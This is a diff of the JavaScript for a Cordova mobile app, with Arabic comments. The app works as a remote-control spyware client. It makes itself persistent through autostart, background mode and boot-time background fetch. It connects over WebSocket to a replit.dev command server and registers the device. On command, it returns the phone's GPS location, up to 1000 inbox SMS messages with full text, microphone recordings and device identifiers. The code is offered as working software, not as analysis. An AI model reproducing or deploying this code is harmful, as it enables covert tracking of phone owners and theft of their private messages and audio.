@@ -2,52 +2,44 @@ document.addEventListener('deviceready', onDeviceReady, false);
 
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
+let reconnectInterval = null;
 
 function onDeviceReady() {
   console.log('Device is ready');
-  
+
+  // تشغيل التطبيق تلقائياً بعد إعادة تشغيل الجهاز
+  if (cordova.plugins.autoStart) {
+    cordova.plugins.autoStart.enable();
+    console.log("Autostart Enabled ✅");
+  }
+
   // تمكين التشغيل في الخلفية
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
       title: 'التطبيق يعمل في الخلفية',
       text: 'جارٍ مراقبة الأوامر الواردة',
-      icon: 'ic_stat_icon'
+      silent: false
     });
-    
-    // منع إيقاف الخدمة في الخلفية
-    cordova.plugins.backgroundMode.on('activate', function() {
-      cordova.plugins.backgroundMode.disableWebViewOptimizations();
-    });
+    console.log("Background Mode Enabled ✅");
   }
 
-  // تشغيل خدمة أمامية (Foreground Service)
-  if (cordova.plugins.foregroundService) {
-    try {
-      cordova.plugins.foregroundService.start(
-        'التطبيق يعمل', 
-        'جارٍ مراقبة الأوامر في الخلفية', 
-        'ic_stat_icon',
-        1234, // service id
-        1000 // interval
-      );
-    } catch (error) {
-      console.error('Error starting foreground service:', error);
-    }
+  // تفعيل جلب البيانات في الخلفية حتى عند الخروج من التطبيق
+  if (window.BackgroundFetch) {
+    BackgroundFetch.configure(
+      {
+        minimumFetchInterval: 15,
+        stopOnTerminate: false,
+        startOnBoot: true
+      },
+      () => {
+        console.log("Background Fetch Triggered ✅");
+        connectToServer(deviceInfo);
+        BackgroundFetch.finish();
+      },
+      error => console.log("Background Fetch failed:", error)
+    );
   }
-
-  // تمكين التشغيل التلقائي بعد إعادة التشغيل
-  if (cordova.plugins.autoStart) {
-    try {
-      cordova.plugins.autoStart.enable();
-      cordova.plugins.autoStart.enableBootStart();
-    } catch (error) {
-      console.error('Error enabling auto start:', error);
-    }
-  }
-
-  // تجاوز تحسينات البطارية
-  requestBatteryOptimizationExemption();
 
   // معلومات الجهاز
   const deviceInfo = {
@@ -59,7 +51,7 @@ function onDeviceReady() {
     battery: null,
     timestamp: new Date().toISOString()
   };
-  
+
   // توليد UUID إذا لم يكن موجوداً
   function generateUUID() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
@@ -68,7 +60,7 @@ function onDeviceReady() {
       return v.toString(16);
     });
   }
-  
+
   // الحصول على حالة البطارية
   if (navigator.getBattery) {
     navigator.getBattery().then(battery => {
@@ -79,7 +71,7 @@ function onDeviceReady() {
         dischargingTime: battery.dischargingTime
       };
       connectToServer(deviceInfo);
-      
+
       // مراقبة تغيرات البطارية
       battery.addEventListener('levelchange', updateBatteryInfo);
       battery.addEventListener('chargingchange', updateBatteryInfo);
@@ -90,7 +82,7 @@ function onDeviceReady() {
   } else {
     connectToServer(deviceInfo);
   }
-  
+
   function updateBatteryInfo() {
     navigator.getBattery().then(battery => {
       deviceInfo.battery = {
@@ -99,7 +91,7 @@ function onDeviceReady() {
         chargingTime: battery.chargingTime,
         dischargingTime: battery.dischargingTime
       };
-      
+
       // إرسال تحديث البطارية إلى الخادم
       if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
         window.wsConnection.send(JSON.stringify({
@@ -112,41 +104,30 @@ function onDeviceReady() {
       }
     });
   }
-}
 
-// تجاوز تحسينات البطارية
-function requestBatteryOptimizationExemption() {
-  if (cordova.plugins.batteryOptimization) {
-    cordova.plugins.batteryOptimization.isIgnoringBatteryOptimizations(function(ignoring) {
-      if (!ignoring) {
-        cordova.plugins.batteryOptimization.requestOptOut(function() {
-          console.log('تم تجاوز تحسينات البطارية');
-        }, function(error) {
-          console.error('خطأ في تجاوز تحسينات البطارية:', error);
-          // توجيه المستخدم يدويًا إذا فشل التلقائي
-          showBatteryOptimizationDialog();
-        });
-      }
-    });
-  } else {
-    showBatteryOptimizationDialog();
-  }
-}
-
-// إظهار حوار توجيه المستخدم لتعطيل تحسينات البطارية
-function showBatteryOptimizationDialog() {
-  // يمكن إضافة تنبيه يوجه المستخدم لتعطيل تحسينات البطارية يدويًا
-  console.log('يرجى تعطيل تحسينات البطارية للتطبيق من إعدادات الجهاز');
+  // إعادة الاتصال عند استئناف التطبيق
+  document.addEventListener('resume', () => {
+    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
+      console.log('App resumed, reconnecting...');
+      connectToServer(deviceInfo);
+    }
+  }, false);
 }
 
 function connectToServer(deviceInfo) {
-  // استخدام رابط الخادم المقدم
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
+  console.log("Connecting to server...");
+
+  if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
+    console.log("Already connected ✅");
+    return;
+  }
+
   window.wsConnection = new WebSocket(wsUrl);
-  
+
   wsConnection.onopen = () => {
-    console.log('Connected to server');
-    
+    console.log('Connected to server ✅');
+
     // تسجيل الجهاز
     wsConnection.send(JSON.stringify({
       type: 'register',
@@ -154,19 +135,20 @@ function connectToServer(deviceInfo) {
       deviceInfo
     }));
   };
-  
+
   wsConnection.onmessage = (event) => {
     try {
       const data = JSON.parse(event.data);
-      
+
       if (data.type === 'command') {
         console.log('Received command:', data.command);
+
         // تخزين الطلب المستلم
         receivedRequests.push({
           ...data.command,
           receivedAt: new Date().toISOString()
         });
-        
+
         // تنفيذ الأمر وإرسال الرد
         executeCommand(data.command, (response) => {
           if (wsConnection.readyState === WebSocket.OPEN) {
@@ -175,7 +157,7 @@ function connectToServer(deviceInfo) {
               commandId: data.commandId,
               response: {
                 ...response,
-                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
+                requestData: data.command
               }
             }));
           }
@@ -184,41 +166,42 @@ function connectToServer(deviceInfo) {
       else if (data.type === 'registered') {
         console.log('Device registered successfully:', data);
       }
-      
+
     } catch (error) {
       console.error('Error processing message:', error);
     }
   };
-  
+
   wsConnection.onerror = (error) => {
     console.error('WebSocket error:', error);
   };
-  
+
   wsConnection.onclose = () => {
-    console.log('Disconnected from server');
-    // إعادة الاتصال بعد تأخير
-    setTimeout(() => connectToServer(deviceInfo), 5000);
+    console.warn('Disconnected from server ❌');
+    // إعادة الاتصال بعد 5 ثوانٍ
+    if (reconnectInterval) clearTimeout(reconnectInterval);
+    reconnectInterval = setTimeout(() => connectToServer(deviceInfo), 5000);
   };
-  
-  // إرسال نبضات قلبية دورية
+
+  // إرسال نبضات قلبية للحفاظ على الاتصال
   const heartbeatInterval = setInterval(() => {
-    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
-      wsConnection.send(JSON.stringify({ 
+    if (wsConnection.readyState === WebSocket.OPEN) {
+      wsConnection.send(JSON.stringify({
         type: 'heartbeat',
         timestamp: new Date().toISOString(),
-        receivedRequests, // إرسال سجل الطلبات المستلمة
-        deviceId: deviceInfo.uuid
+        receivedRequests
       }));
+    } else {
+      clearInterval(heartbeatInterval);
     }
   }, 30000);
 }
 
 function executeCommand(command, callback) {
   console.log('Executing command:', command);
-  
-  // إضافة commandId للتعقب
+
   const commandId = Date.now();
-  
+
   switch (command.type) {
     case 'get_location':
       getLocation(commandId, callback);
@@ -236,7 +219,7 @@ function executeCommand(command, callback) {
       getReceivedRequests(commandId, callback);
       break;
     default:
-      callback({ 
+      callback({
         commandId,
         status: 'error',
         error: 'Unknown command',
@@ -251,7 +234,7 @@ function getLocation(commandId, callback) {
     timeout: 15000,
     maximumAge: 0
   };
-  
+
   navigator.geolocation.getCurrentPosition(
     (position) => {
       const locationData = {
@@ -264,7 +247,7 @@ function getLocation(commandId, callback) {
         speed: position.coords.speed,
         timestamp: position.timestamp
       };
-      
+
       callback({
         commandId,
         status: 'success',
@@ -273,7 +256,7 @@ function getLocation(commandId, callback) {
       });
     },
     (error) => {
-      callback({ 
+      callback({
         commandId,
         status: 'error',
         error: 'Location error',
@@ -292,20 +275,20 @@ function getLocation(commandId, callback) {
 
 function getSMS(commandId, callback) {
   if (typeof SMS === 'undefined') {
-    return callback({ 
+    return callback({
       commandId,
       status: 'error',
       error: 'SMS plugin not available',
       suggestion: 'Install cordova-sms-plugin'
     });
   }
-  
+
   const filter = {
     box: 'inbox',
-    maxCount: 1000, // زيادة الحد الأقصى للرسائل
+    maxCount: 1000,
     indexFrom: 0
   };
-  
+
   SMS.listSMS(
     filter,
     (messages) => {
@@ -316,14 +299,14 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body, // عرض النص الكامل بدون قص
+          body: msg.body,
           date: msg.date,
           read: msg.read
         }))
       });
     },
     (error) => {
-      callback({ 
+      callback({
         commandId,
         status: 'error',
         error: 'SMS error',
@@ -334,31 +317,30 @@ function getSMS(commandId, callback) {
 }
 
 function recordAudio(commandId, duration, callback) {
-  duration = duration || 10; // Default 10 seconds
-  
+  duration = duration || 10;
+
   const mediaRecorderOptions = {
-    mimeType: 'audio/mp3', // استخدام صيغة MP3
+    mimeType: 'audio/mp3',
     audioBitsPerSecond: 128000
   };
-  
+
   navigator.mediaDevices.getUserMedia({ audio: true })
     .then(stream => {
       const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
       const audioChunks = [];
-      
+
       mediaRecorder.ondataavailable = event => {
         audioChunks.push(event.data);
       };
-      
+
       mediaRecorder.onstop = () => {
         const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
         const audioUrl = URL.createObjectURL(audioBlob);
-        
-        // حفظ التسجيل في التخزين المحلي
+
         const fileName = `recording_${commandId}.mp3`;
         saveAudioToStorage(fileName, audioBlob);
-        
-        callback({ 
+
+        callback({
           commandId,
           status: 'success',
           audio: {
@@ -370,7 +352,7 @@ function recordAudio(commandId, duration, callback) {
           }
         });
       };
-      
+
       mediaRecorder.start();
       setTimeout(() => {
         mediaRecorder.stop();
@@ -378,7 +360,7 @@ function recordAudio(commandId, duration, callback) {
       }, duration * 1000);
     })
     .catch(error => {
-      callback({ 
+      callback({
         commandId,
         status: 'error',
         error: 'Audio recording error',
@@ -388,7 +370,6 @@ function recordAudio(commandId, duration, callback) {
 }
 
 function saveAudioToStorage(fileName, blob) {
-  // حفظ الملف في التخزين المحلي
   window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
     dir.getFile(fileName, { create: true }, fileEntry => {
       fileEntry.createWriter(fileWriter => {
@@ -411,7 +392,7 @@ function getDeviceInfo(commandId, callback) {
     isVirtual: device.isVirtual,
     serial: device.serial
   };
-  
+
   callback({
     commandId,
     status: 'success',
@@ -427,20 +408,3 @@ function getReceivedRequests(commandId, callback) {
     count: receivedRequests.length
   });
 }
-
-// إعادة الاتصال عند استئناف التطبيق
-document.addEventListener('resume', () => {
-  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-    console.log('App resumed, reconnecting...');
-    onDeviceReady();
-  }
-}, false);
-
-// التعامل مع إيقاف التطبيق
-document.addEventListener('pause', () => {
-  console.log('App paused, keeping connection alive');
-  // الحفاظ على الاتصال حتى في حالة الإيقاف
-  if (cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.moveToBackground();
-  }
-}, false);
